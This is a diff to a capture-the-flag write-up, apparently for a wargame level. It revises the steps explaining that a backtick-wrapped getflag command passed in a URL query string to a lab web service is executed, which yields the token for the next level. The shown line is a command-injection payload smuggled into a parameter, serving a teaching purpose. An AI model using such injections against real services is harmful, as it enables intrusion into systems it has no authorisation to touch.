@@ -44,10 +44,10 @@ Steps:
   ```BASH
   http://10.0.2.15:4747/
   ```
-  - Use the query string to pass the getflag command
+  - Use the query string to pass the getflag command. We need to send \`getflag\` so that it will be executed (try echo \`getflag\` in terminal for example). `getflag` as a parameter will only print getflag.
   ``` bash
   http://192.168.1.67:4747/?x=`getflag`
   ```
-  We need to send \`getflag\` so that it will be executed (try echo \`getflag\` in terminal for example). `getflag` as a parameter will only print getflag.
+
  
-Here we can found the token.
+The program returns the token directly, so we can go to level05 with `su level05`.
